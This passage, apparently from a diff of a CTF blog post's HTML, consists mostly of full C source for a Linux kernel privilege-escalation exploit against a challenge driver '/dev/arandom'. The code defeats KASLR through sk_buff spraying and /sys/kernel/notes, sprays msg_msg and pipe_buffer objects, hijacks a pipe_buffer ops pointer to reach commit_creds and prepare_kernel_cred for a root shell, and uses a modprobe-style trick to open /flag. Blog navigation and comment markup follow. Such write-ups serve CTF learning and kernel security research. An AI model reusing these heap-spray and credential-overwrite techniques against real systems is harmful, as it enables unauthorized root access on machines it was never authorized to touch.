class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">  <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">  write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">  close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __always_inline <span class="title function_">pt_reg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buffer)</span> &#123;</span><br><span class="line">  __asm__ __volatile__(<span class="string">&quot;movq $0xbeefdead,   %%r15;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x11111111,   %%r14;&quot;</span> <span class="comment">// 0x78</span></span><br><span class="line">                       <span class="string">&quot;movq $0x22222222,   %%r13;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x33333333,   %%r12;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x66666666,   %%r11;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x77777777,   %%r10;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x88888888,    %%r9;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x99999999,    %%r8;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0xaaaaaaaa,   %%rcx;&quot;</span></span><br><span class="line">                       <span class="string">&quot;xorq %%rdi,   %%rdi;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movl %0,   %%edi;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq %1,   %%rsi;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x20,   %%rdx;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $1,   %%rax;&quot;</span></span><br><span class="line">                       <span class="string">&quot;syscall;&quot;</span> ::<span class="string">&quot;r&quot;</span>(fd),</span><br><span class="line">                       <span class="string">&quot;r&quot;</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * read /sys/kernel/notes for passing kaslr</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">leak_from_notes</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd_leak = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">char</span> leak[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  read(fd_leak, leak, <span class="number">0x100</span>);</span><br><span class="line">  <span class="type">uint64_t</span> base = *(<span class="type">uint64_t</span> *)(&amp;leak[<span class="number">0x9c</span>]) - <span class="number">0x2000</span>;</span><br><span class="line">  success(<span class="string">&quot;leaking address: %#lx&quot;</span>, base);</span><br><span class="line">  <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/chmod 777 /flag&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">  usleep(<span class="number">3000</span>);</span><br><span class="line">  system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  pause();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag2</span><span class="params">()</span> &#123;</span><br><span class="line">  execve(<span class="string">&quot;/tmp/dummy&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="type">int</span> fd_flag = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  read(fd_flag, buf, <span class="number">0x50</span>);</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">0x50</span>);</span><br><span class="line">  pause();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_pipe</span><span class="params">(<span class="type">int</span> flides[<span class="number">2</span>])</span> &#123;</span><br><span class="line">  close(flides[<span class="number">0</span>]);</span><br><span class="line">  close(flides[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__((constructor)) init() &#123;</span><br><span class="line">  bind_cpu(<span class="number">0</span>);</span><br><span class="line">  page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arandom_params</span> // <span class="title">sizeof</span>=</span><span class="number">0xC</span></span><br><span class="line">&#123;                     <span class="comment">// XREF: random_info/r</span></span><br><span class="line">  <span class="type">uint32_t</span> rand_size; <span class="comment">// XREF: arandom_ioctl+BF/r</span></span><br><span class="line">  <span class="type">uint32_t</span> rand_offset;</span><br><span class="line">  <span class="type">uint32_t</span> rand_value;</span><br><span class="line">&#125; AAA;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">adjust_rlimit</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = (200 &lt;&lt; 20);</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_AS, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 32 &lt;&lt; 20;</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 136 &lt;&lt; 20;</span></span><br><span class="line"><span class="comment">  // setrlimit(RLIMIT_FSIZE, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 1 &lt;&lt; 20;</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_STACK, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 0;</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_CORE, &amp;rlim);</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">// RLIMIT_FILE</span></span><br><span class="line">  rlim.rlim_cur = rlim.rlim_max = <span class="number">14096</span>;</span><br><span class="line">  <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">4096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">      err_exit(<span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pre_spray</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRE_MSG_NUM 56</span></span><br><span class="line">  <span class="type">int</span> pre_ms_qid[PRE_MSG_NUM];</span><br><span class="line">  <span class="type">char</span> *pre_msg_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">  <span class="type">char</span> *pre_msg_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE_MSG_NUM; ++i) &#123;</span><br><span class="line">    pre_ms_qid[i] = get_msg_queue();</span><br><span class="line">    <span class="built_in">memset</span>(pre_msg_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    check(write_msg(pre_ms_qid[i], pre_msg_buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;pre spray msg_msg successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE_MSG_NUM - <span class="number">8</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    check(read_msg(pre_ms_qid[i], pre_msg_recv, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;free some objs\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = PRE_MSG_NUM - <span class="number">7</span>; i &lt; PRE_MSG_NUM; ++i) &#123;</span><br><span class="line">    check(read_msg(pre_ms_qid[i], pre_msg_recv, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;free before 8 objs\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipe</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_num = <span class="number">0x100</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_buf_size = page_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *pipe_buf = <span class="built_in">malloc</span>(pipe_buf_size);</span><br><span class="line">  <span class="type">int</span> pipe_fd[pipe_num][<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fd[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, i, pipe_buf_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1</span>; ++j) &#123;</span><br><span class="line">      check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, pipe_buf_size));</span><br><span class="line">    &#125;</span><br><span class="line">    check(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>));</span><br><span class="line">    check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_seq</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> seq_file_num = <span class="number">0xc00</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> seq_fd[seq_file_num];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; seq_file_num; ++i) &#123;</span><br><span class="line">    seq_fd[i] = check(open(<span class="string">&quot;/proc/self/stat&quot;</span>, <span class="number">0</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray seq_op successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1003</span>)); <span class="comment">// write</span></span><br><span class="line">  info(<span class="string">&quot;write buffer+%#x &lt;- %#x\n&quot;</span>, AAA.rand_offset, AAA.rand_value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> Linux v6.11 add msg_msg-xx kmalloc cache and only affects the first</span></span><br><span class="line"><span class="comment">// page, which means we can&#x27;t use it to perform heap spray :(</span></span><br><span class="line"><span class="comment">// Pwned :)</span></span><br><span class="line"><span class="comment">// Success rate: approximately 1/40</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// ioctl: 0x1001: alloc 0x1002: free</span></span><br><span class="line">  <span class="comment">// 0x1003:</span></span><br><span class="line">  <span class="comment">// *(_DWORD *)((char *)buffer + rand_offset) = AAA.rand_value;</span></span><br><span class="line">  <span class="comment">// 0x1004:</span></span><br><span class="line">  <span class="comment">// copy_to_user AAA</span></span><br><span class="line">  <span class="comment">// 0x1005:</span></span><br><span class="line">  <span class="comment">// if ( *(_QWORD *)((char *)buffer + v4) == AAA.rand_value</span></span><br><span class="line">  <span class="comment">//&amp;&amp; v4 == *(_QWORD *)((char *)buffer + v4 + 16)</span></span><br><span class="line">  <span class="comment">//&amp;&amp; *(_QWORD *)((char *)buffer + v4 + 24) == AAA.rand_size )</span></span><br><span class="line">  <span class="comment">//&#123;</span></span><br><span class="line">  <span class="comment">//*(_QWORD *)((char *)buffer + v4 + 32) = &amp;get_random_bytes;</span></span><br><span class="line">  <span class="comment">//&#125;</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  save_stat();</span><br><span class="line">  adjust_rlimit();</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;page size: %#lx\n&quot;</span>, page_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x01: open device</span></span><br><span class="line">  step(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd = check(open(<span class="string">&quot;/dev/arandom&quot;</span>, <span class="number">2</span>));</span><br><span class="line">  success(<span class="string">&quot;device open successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  ioctl(fd, <span class="number">0x1004</span>, &amp;AAA);</span><br><span class="line">  info(<span class="string">&quot;arandom rand_size: %#x\n&quot;</span>, AAA.rand_size);</span><br><span class="line">  info(<span class="string">&quot;arandom rand_offset: %#x\n&quot;</span>, AAA.rand_offset);</span><br><span class="line">  info(<span class="string">&quot;arandom rand_value: %#x\n&quot;</span>, AAA.rand_value);</span><br><span class="line"></span><br><span class="line">  ioctl(fd, <span class="number">0x1001</span>); <span class="comment">// alloc</span></span><br><span class="line">  info(<span class="string">&quot;alloc buffer size: %#x\n&quot;</span>, AAA.rand_size);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1002</span>)); <span class="comment">// free</span></span><br><span class="line">  info(<span class="string">&quot;free buffer successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> offset = AAA.rand_offset &amp; <span class="number">0xfff</span>;</span><br><span class="line">  info(<span class="string">&quot;page offset: %#x\n&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x02: spray sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;spray sk_buff&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 10</span></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_reserve_size = <span class="number">320</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_size = page_size - skb_reserve_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> *skb_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    check(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]));</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf, (<span class="type">char</span>)i, skb_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf, <span class="string">&quot;hamoood&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf + offset, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x10</span>, &amp;AAA.rand_offset, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x18</span>, &amp;AAA.rand_size, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(write(sk_sockets[i][<span class="number">0</span>], skb_buf, skb_size));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray sk_buff successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x03: check &amp; read sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;check &amp; read sk_buff&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *skb_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1005</span>)); <span class="comment">// check</span></span><br><span class="line">  info(<span class="string">&quot;check buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;read sk_buff length %#x\n&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(read(sk_sockets[i][<span class="number">1</span>], skb_recv, skb_size));</span><br><span class="line"></span><br><span class="line">      <span class="type">uint64_t</span> possible_addr = *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> ((possible_addr &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span>) &#123;</span><br><span class="line">        success(<span class="string">&quot;find kernel addr at No.%d: %#lx\n&quot;</span>, i,</span><br><span class="line">                *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>));</span><br><span class="line">        kernel_base = possible_addr - calc(<span class="number">0xffffffff81907850</span>);</span><br><span class="line">        success(<span class="string">&quot;find kernel base: %#lx\n&quot;</span>, kernel_base);</span><br><span class="line">        <span class="keyword">goto</span> FIND;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (kernel_base == <span class="number">0</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;not found&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">FIND:</span><br><span class="line">  <span class="comment">// INFO: Step 0x04: spray pipe_buffer</span></span><br><span class="line">  step(<span class="string">&quot;spray pipe_buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *page;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">void</span> *ops;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">  &#125; pipe_example;</span><br><span class="line"></span><br><span class="line">  pipe_example.page = (<span class="type">void</span> *)<span class="number">0xffffea0000000000</span>;</span><br><span class="line">  pipe_example.len = <span class="number">0x1000</span>;</span><br><span class="line">  pipe_example.offset = <span class="number">0x0</span>;</span><br><span class="line">  pipe_example.ops = (<span class="type">void</span> *)calc(<span class="number">0xffffffff8222bb80</span>);</span><br><span class="line">  pipe_example.ops = <span class="literal">NULL</span>;</span><br><span class="line">  pipe_example.flags = <span class="number">0x10</span>;</span><br><span class="line">  pipe_example.private = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> pipe_buffer_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;pipe_buffer size: %#lx\n&quot;</span>, pipe_buffer_size);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_num = <span class="number">0x10</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_buf_size = page_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> inner_pipe_offset = offset % pipe_buffer_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *pipe_buf = <span class="built_in">malloc</span>(pipe_buf_size);</span><br><span class="line">  <span class="type">int</span> pipe_fd[pipe_num][<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fd[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, i, pipe_buf_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, pipe_buf_size));</span><br><span class="line">    check(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1</span>; ++j) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(pipe_buf + <span class="number">0x8</span>, j, <span class="number">0x8</span>);</span><br><span class="line">      check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray pipe_buffer successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x05: write random value</span></span><br><span class="line">  step(<span class="string">&quot;write random value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;inner pipe offset: %#x\n&quot;</span>, inner_pipe_offset);</span><br><span class="line">  info(<span class="string">&quot;before writting:\n&quot;</span>);</span><br><span class="line">  dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">char</span> *)(&amp;pipe_example) + inner_pipe_offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1003</span>)); <span class="comment">// write</span></span><br><span class="line">  info(<span class="string">&quot;write buffer+%#x &lt;- %#x\n&quot;</span>, AAA.rand_offset, AAA.rand_value);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;after writting:\n&quot;</span>);</span><br><span class="line">  dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *fake_ops = pipe_example.ops;</span><br><span class="line">  <span class="type">void</span> *fake_ops_page = (<span class="type">void</span> *)((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xFFFFFFFFFffff000</span>);</span><br><span class="line">  <span class="type">uint32_t</span> fake_ops_page_offset = ((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pipe_example.ops == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;Useless write&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;affect pipe_buffer&#x27;s ops successfully\n&quot;</span>);</span><br><span class="line">  success(<span class="string">&quot;pipe_buffer&#x27;s ops: %p\n&quot;</span>, pipe_example.ops);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;mmap page %p\n&quot;</span>, fake_ops_page);</span><br><span class="line">  <span class="type">void</span> *mmap_page = mmap(fake_ops_page, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                         MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mmap_page != fake_ops_page) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;mmap error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x06: close pipes</span></span><br><span class="line">  step(<span class="string">&quot;close pipes&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ffffffff812c8d40 T commit_creds</span></span><br><span class="line">  <span class="comment">// ffffffff812c8fd0 T prepare_kernel_cred</span></span><br><span class="line">  commit_creds = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8d40</span>);</span><br><span class="line">  prepare_kernel_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8fd0</span>);</span><br><span class="line">  init_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff82a54120</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> win_addr = (<span class="type">uint64_t</span>)win;</span><br><span class="line">  info(<span class="string">&quot;win address: %#lx\n&quot;</span>, win_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_ops + i * <span class="number">8</span>, &amp;win_addr, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(close(pipe_fd[i][<span class="number">0</span>]));</span><br><span class="line">    check(close(pipe_fd[i][<span class="number">1</span>]));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  shell();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    0xffffffff8170540b &lt;load_msg+59&gt;    call   0xffffffff81501210</span></span><br><span class="line"><span class="comment">    &lt;__kmalloc_node_noprof&gt;</span></span><br><span class="line"><span class="comment">    rdi: 0xa00</span></span><br><span class="line"><span class="comment">    rsi: 0xffff8880044512a0 &lt;- 0</span></span><br><span class="line"><span class="comment">    rdx: 0xcc0</span></span><br><span class="line"><span class="comment">    rcx: 0xffffffff</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
-              <a href="/tags/kernel/" rel="tag"># kernel</a>
-          </div>
-
-        
+  </div>
+</article>
 
 
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2025/04/15/ebpf1/" rel="prev" title="[Linux Kernel Pwn] eBPF 入门笔记（一）">
-      <i class="fa fa-chevron-left"></i> [Linux Kernel Pwn] eBPF 入门笔记（一）
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2025/05/21/languages/" rel="next" title="自然语言&赛博语言の奇思妙想">
-      自然语言&赛博语言の奇思妙想 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
         </div>
-          
